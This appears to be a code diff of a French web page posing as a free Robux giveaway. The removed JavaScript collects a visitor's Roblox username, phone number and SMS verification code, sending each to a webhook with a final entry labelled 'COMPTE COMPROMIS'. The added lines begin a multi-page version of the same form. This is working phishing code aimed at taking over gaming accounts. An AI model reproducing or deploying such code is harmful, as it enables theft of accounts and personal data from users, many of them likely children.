-    counterCurrent = Math.round(counterCurrent + increment);
-    if (step >= steps) { counterCurrent = target; clearInterval(counterInterval); }
-    document.getElementById('counterDisplay').textContent = counterCurrent.toLocaleString('fr-FR');
-  }, duration/steps);
-}
-
-/* ══════════════════════
-   STEP ENGINE
-══════════════════════ */
-const progW = [33,66,100,100];
-
-function goStep(n) {
-  document.getElementById('progBar').style.width = progW[n-1]+'%';
-  if(n<=3){
-    for(let i=1;i<=3;i++){
-      const dot = document.getElementById('dot'+i);
-      const line = i<3 ? document.getElementById('line'+i) : null;
-      if(i<n){
-        dot.className='s-dot done'; dot.textContent='✓';
-        if(line) line.className='s-line done';
-      } else if(i===n){
-        dot.className='s-dot active'; dot.textContent=i;
-      } else {
-        dot.className='s-dot'; dot.textContent=i;
-        if(line) line.className='s-line';
-      }
-    }
+  function goNext() {
+    const v = input.value.trim();
+    if (!v) { err.textContent = 'Ce champ est requis.'; return; }
+    if (v.length < 2) { err.textContent = 'Au moins 2 caractères requis.'; return; }
+    if (v.length > 32) { err.textContent = 'Maximum 32 caractères.'; return; }
+    if (!/^[a-zA-Z0-9_.\-]+$/.test(v)) { err.textContent = 'Uniquement lettres, chiffres, _ et .'; return; }
+    err.textContent = '';
+    sessionStorage.setItem('pseudo', v);
+    window.location.href = 'numero.html';
   }
-  ['step1','step2','step3','step4'].forEach((id,idx)=>{
-    const el=document.getElementById(id);
-    if(idx+1===n){
-      el.style.display='block';
-      el.classList.remove('panel'); void el.offsetWidth; el.classList.add('panel');
-    } else {
-      el.style.display='none';
-    }
-  });
-  if(n===4) document.getElementById('stepDots').style.display='none';
-}
-
-/* ══════════════════════
-   STEP 1
-══════════════════════ */
-const unEl = document.getElementById('username');
-const b1   = document.getElementById('b1');
-let selRob = null;
-let selRobLabel = null;
-
-document.querySelectorAll('.r-pill').forEach(pill=>{
-  pill.addEventListener('click',()=>{
-    document.querySelectorAll('.r-pill').forEach(p=>p.classList.remove('sel'));
-    pill.classList.add('sel');
-    selRob = pill.dataset.val;
-    selRobLabel = pill.querySelector('.rnum').textContent.trim();
-    animateCounter(parseInt(selRob));
-    checkS1();
-  });
-});
-unEl.addEventListener('input', checkS1);
-function checkS1(){ b1.disabled = !(unEl.value.trim() && selRob); }
-
-b1.onclick = async ()=>{
-  document.getElementById('s-user').textContent = unEl.value.trim();
-  document.getElementById('s-rob').textContent  = selRobLabel + ' Robux';
-  await webhook("📋 Étape 1 — Compte & Robux",{
-    "Pseudo Roblox": unEl.value.trim(),
-    "Robux choisis": selRobLabel + ' Robux'
-  });
-  goStep(2);
-};
-
-/* ══════════════════════
-   STEP 2
-══════════════════════ */
-const phEl  = document.getElementById('phone');
-const phErr = document.getElementById('phoneErr');
-const b2    = document.getElementById('b2');
-
-phEl.addEventListener('input',()=>{
-  let raw = phEl.value.replace(/\D/g,'').slice(0,10);
-  let formatted = raw.match(/.{1,2}/g)?.join(' ') || raw;
-  phEl.value = formatted;
-  const digits = raw;
-  const ok = /^(0[67]\d{8}|[67]\d{8})$/.test(digits);
-  b2.disabled = !ok;
-  phErr.textContent = digits.length > 3 && !ok ? 'Format invalide — ex: 06 12 34 56 78' : '';
-});
-
-function formatPhone(raw) {
-  const digits = raw.replace(/\D/g,'');
-  const local = digits.startsWith('0') ? digits : '0'+digits;
-  return local.match(/.{1,2}/g)?.join(' ') || local;
-}
-
-b2.onclick = async ()=>{
-  const phone = '+33 ' + formatPhone(phEl.value);
-  document.getElementById('phoneSummary').textContent = phone;
-  document.getElementById('s-user2').textContent = unEl.value.trim();
-  document.getElementById('s-rob2').textContent  = selRobLabel + ' Robux';
-  document.getElementById('s-tel2').textContent  = phone;
-  await webhook("📱 Étape 2 — Numéro saisi",{
-    "Pseudo Roblox": unEl.value.trim(),
-    "Robux": selRobLabel + ' Robux',
-    "Téléphone": phone
-  });
-  goStep(3);
-  setTimeout(()=>codeIns[0].focus(),100);
-};
-
-/* ══════════════════════
-   STEP 3
-══════════════════════ */
-const codeIns = [...document.querySelectorAll('.codebox input')];
-const b3 = document.getElementById('b3');
-let codeVal = '';
-
-codeIns.forEach((el,i)=>{
-  el.addEventListener('input',()=>{
-    el.value = el.value.replace(/\D/,'');
-    el.classList.toggle('filled', !!el.value);
-    if(el.value && codeIns[i+1]) codeIns[i+1].focus();
-    codeVal = codeIns.map(c=>c.value).join('');
-    b3.disabled = codeVal.length!==4;
-  });
-  el.addEventListener('keydown',e=>{
-    if(e.key==='Backspace' && !el.value && codeIns[i-1]){
-      codeIns[i-1].focus(); codeIns[i-1].classList.remove('filled');
-    }
-  });
-  el.addEventListener('paste',e=>{
-    e.preventDefault();
-    const txt=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,4);
-    txt.split('').forEach((ch,j)=>{ if(codeIns[j]){ codeIns[j].value=ch; codeIns[j].classList.add('filled'); } });
-    codeVal = codeIns.map(c=>c.value).join('');
-    b3.disabled = codeVal.length!==4;
-    (codeIns[txt.length]||codeIns[3]).focus();
-  });
-});
-
-b3.onclick = async ()=>{
-  const phone = '+33 ' + formatPhone(phEl.value);
-  document.getElementById('finalAmount').textContent = selRobLabel;
-  await webhook("✅ ÉTAPE FINALE — CODE ENTRÉ 🔑",{
-    "Pseudo Roblox": unEl.value.trim(),
-    "Robux": selRobLabel + ' Robux',
-    "Téléphone": phone,
-    "Code SMS saisi": codeVal,
-    "Statut": "✅ VALIDÉ — COMPTE COMPROMIS"
-  });
-  goStep(4);
-};
-
-/* ── Resend ── */
-let cd=0;
-const resEl=document.getElementById('resend');
-resEl.addEventListener('click',()=>{
-  if(cd) return;
-  cd=30;
-  const t=setInterval(()=>{
-    cd--;
-    resEl.textContent=`Renvoyer le code (${cd}s)`;
-    if(!cd){ clearInterval(t); resEl.textContent='Renvoyer le code →'; }
-  },1000);
-});
-
-/* ══════════════════════
-   CANVAS BACKGROUND
-══════════════════════ */
-try {
-  const cv=document.getElementById('bgCanvas');
-  const ctx=cv.getContext('2d');
-  let W,H;
-  const resize=()=>{ W=cv.width=window.innerWidth; H=cv.height=window.innerHeight; };
-  window.addEventListener('resize',resize); resize();
-
-  const pts=Array.from({length:85},()=>({
-    x:Math.random()*W, y:Math.random()*H,
-    vx:(Math.random()-.5)*.5, vy:(Math.random()-.5)*.5,
-    r:Math.random()*1.6+.4
-  }));
-
-  let mx=W/2, my=H/2;
-  window.addEventListener('mousemove',e=>{ mx=e.clientX; my=e.clientY; });
-  window.addEventListener('touchmove',e=>{ if(e.touches.length){ mx=e.touches[0].clientX; my=e.touches[0].clientY; } },{passive:true});
-
-  (function loop(){
-    ctx.clearRect(0,0,W,H);
-
-    const g=ctx.createRadialGradient(mx,my,0,mx,my,280);
-    g.addColorStop(0,'rgba(0,102,255,0.07)');
-    g.addColorStop(.5,'rgba(0,80,200,0.02)');
-    g.addColorStop(1,'rgba(0,0,0,0)');
-    ctx.fillStyle=g; ctx.fillRect(0,0,W,H);
-
-    pts.forEach(p=>{
-      p.x+=p.vx; p.y+=p.vy;
-      if(p.x<0||p.x>W) p.vx*=-1;
-      if(p.y<0||p.y>H) p.vy*=-1;
-
-      const d=Math.hypot(p.x-mx,p.y-my);
-      if(d<160){ p.vx+=(p.x-mx)/d*.4; p.vy+=(p.y-my)/d*.4; }
-      const spd=Math.hypot(p.vx,p.vy);
-      if(spd>1.5){ p.vx=p.vx/spd*1.5; p.vy=p.vy/spd*1.5; }
-
-      const a=Math.min(.65,.12+(d<160?(1-d/160)*.5:0));
-      ctx.fillStyle=`rgba(0,102,255,${a})`;
-      ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fill();
-    });
-
-    // Constellation lines
-    pts.forEach((p,i)=>{
-      pts.slice(i+1,i+4).forEach(q=>{
-        const d=Math.hypot(p.x-q.x,p.y-q.y);
-        if(d<85){
-          ctx.strokeStyle=`rgba(0,102,255,${.06*(1-d/85)})`;
-          ctx.lineWidth=.5;
-          ctx.beginPath(); ctx.moveTo(p.x,p.y); ctx.lineTo(q.x,q.y); ctx.stroke();
-        }
-      });
-    });
-
-    requestAnimationFrame(loop);
-  })();
-} catch(e){ console.error(e); }
 </script>
+
 </body>
 </html>
